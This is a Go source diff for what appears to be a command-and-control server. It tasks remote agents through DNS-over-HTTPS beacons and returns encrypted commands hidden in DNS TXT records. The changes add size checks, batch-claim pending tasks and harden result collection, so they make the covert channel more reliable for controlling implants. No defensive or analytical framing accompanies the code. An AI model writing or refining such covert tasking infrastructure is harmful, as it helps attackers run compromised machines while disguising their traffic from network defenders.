@@ -32,6 +32,11 @@ func dohDecodeServerSide(encoded string) ([]byte, error) {
 // txtData is split into 255-byte character-strings as required by RFC 1035.
 // Passing an empty/nil txtData returns a NODATA response (ANCOUNT=0).
 func dohBuildResponse(txtData []byte) []byte {
+	// DNS RDLENGTH is a uint16. Refuse oversized TXT payloads instead of
+	// silently wrapping the length field and returning a corrupt packet.
+	if len(txtData) > 65535 {
+		return nil
+	}
 	var b []byte
 	// Transaction ID — fixed; the client does not validate it.
 	b = append(b, 0xab, 0xcd)
@@ -68,6 +73,9 @@ func dohBuildResponse(txtData []byte) []byte {
 		rdata = append(rdata, remaining[:chunkLen]...)
 		remaining = remaining[chunkLen:]
 	}
+	if len(rdata) > 65535 {
+		return nil
+	}
 
 	// RDLENGTH
 	b = append(b, byte(len(rdata)>>8), byte(len(rdata)))
@@ -85,6 +93,10 @@ func (s *Server) agentDoHQuery(w http.ResponseWriter, r *http.Request) {
 	name := r.URL.Query().Get("name")
 	if name == "" {
 		http.Error(w, "missing name parameter", http.StatusBadRequest)
+		return
+	}
+	if len(name) > 4096 {
+		http.Error(w, "name too long", http.StatusRequestURITooLong)
 		return
 	}
 
@@ -125,7 +137,7 @@ func (s *Server) dohBeacon(w http.ResponseWriter, encoded string) {
 	}
 	s.db.TouchAgent(agentID)
 
-	tasks, err := s.db.PendingTasks(agentID)
+	tasks, err := s.db.ClaimPendingTasks(agentID, 16)
 	if err != nil || len(tasks) == 0 {
 		// No pending tasks — return 204 so the agent skips decryption.
 		w.WriteHeader(http.StatusNoContent)
@@ -139,7 +151,6 @@ func (s *Server) dohBeacon(w http.ResponseWriter, encoded string) {
 			tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
 		}
 		wires = append(wires, tw)
-		s.db.MarkTaskFetched(t.ID)
 	}
 
 	plaintext, _ := json.Marshal(beaconResponse{Tasks: wires})
@@ -152,7 +163,12 @@ func (s *Server) dohBeacon(w http.ResponseWriter, encoded string) {
 	// Return base64(ciphertext) as a DNS TXT record.
 	txtData := []byte(base64.StdEncoding.EncodeToString(encrypted))
 	w.Header().Set("Content-Type", "application/dns-message")
-	w.Write(dohBuildResponse(txtData)) //nolint:errcheck
+	packet := dohBuildResponse(txtData)
+	if packet == nil {
+		http.Error(w, "response too large", http.StatusRequestEntityTooLarge)
+		return
+	}
+	w.Write(packet) //nolint:errcheck
 }
 
 // dohResult handles result submission requests.
@@ -201,7 +217,10 @@ func (s *Server) dohResult(w http.ResponseWriter, encoded string) {
 		return
 	}
 
-	s.db.InsertResult(req.TaskID, params.AgentID, req.Output, req.Error)
+	if err := s.db.InsertResult(req.TaskID, params.AgentID, req.Output, req.Error); err != nil {
+		http.Error(w, "result rejected", http.StatusBadRequest)
+		return
+	}
 
 	if req.Output != "" {
 		s.printf("[%s] doh task %d output:\n%s\n", params.AgentID[:8], req.TaskID, req.Output)
